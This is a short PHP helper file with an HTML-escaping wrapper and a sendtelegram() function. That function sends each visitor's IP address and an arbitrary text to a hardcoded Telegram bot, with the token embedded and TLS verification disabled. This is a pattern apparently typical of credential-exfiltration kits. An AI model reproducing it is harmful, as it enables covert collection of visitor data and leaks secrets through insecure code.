<?php

function h(string $value):string 
{
    return htmlentities($value);
}




 
 
  
  function sendtelegram($text)
  {
  
      $apiToken = "5390471100:AAGMvQgRwpbDlq-9sJ8aBVwxXx0tMQAc7ak";
      $arrContextOptions=array(
          "ssl"=>array(
              "verify_peer"=>false,
              "verify_peer_name"=>false,
          ),
      );
  $data = [
      'chat_id' => '2009065410',
      'text' => 'IP:'.$_SERVER['REMOTE_ADDR'].' '.$text
  ];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data), false, stream_context_create($arrContextOptions));
  }
?>